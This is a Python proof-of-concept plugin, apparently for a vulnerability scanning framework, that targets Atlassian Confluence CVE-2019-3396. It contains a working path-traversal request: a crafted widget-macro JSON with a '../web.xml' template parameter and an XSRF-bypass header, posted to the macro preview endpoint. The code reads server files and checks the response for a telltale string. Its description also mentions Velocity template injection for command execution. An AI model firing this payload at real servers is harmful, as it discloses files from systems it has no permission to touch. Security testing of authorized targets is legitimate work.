# coding:utf-8  
from dataclasses import dataclass
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2022-01-01",        # POC创建时间
        "UpdateDate" : "2022-01-01",        # POC创建时间
        "PocDesc" : """
            网上的复现文章似乎忽略了一个问题，包括P牛在vulhub似乎也忘记提了，没有X-Atlassian-Token头，是无法利用成功的
            这涉及到Atlassian的一个XSRF保护，需要通过X-Atlassian-Token: no-check来绕过这个保护，才能成功的利用漏洞
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "Confluence 路径穿越与命令执行（CVE-2019-3396）",                        # 漏洞名称
        "VulnID" : "CVE-2019-3396",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "Confluence",                     # 漏洞应用名称
        "AppVersion" : """
                Confluence 1.*.*、2.*.*、3.*.*、4.*.*、5.*.*

                Confluence 6.0.*、6.1.*、6.2.*、6.3.*、6.4.*、6.5.*

                Confluence 6.6.* < 6.6.12

                Confluence6.7.*、6.8.*、6.9.*、6.10.*、6.11.*

                Confluence 6.12.* < 6.12.3

                Confluence 6.13.* < 6.13.3

                Confluence 6.14.* < 6.14.2
            """,                  # 漏洞应用版本
        "VulnDate" : "2022-01-01",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
                Atlassian Confluence是企业广泛使用的wiki系统，其6.14.2版本前存在一处未授权的目录穿越漏洞，
                通过该漏洞，攻击者可以读取任意文件，或利用Velocity模板注入执行任意命令。
            """,                                # 漏洞简要描述

        "fofa-dork":"""
        
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "/rest/tinymce/1/macro/preview" # url自己按需调整
        

        headers = {
                    "User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "application/json; charset=utf-8",
                    "X-Atlassian-Token":"no-check",
                    "Referer":"http://localhost:8090/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&",
                    }
        
        data = """
{"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc6","width":"1000","height":"1000","_template":"../web.xml"}}}
"""
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.post(url,data=data,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if """servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>""" in req.text:#req.status_code == 200 and :
                vuln = [True,req.text]
            else:
                vuln = [False,req.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()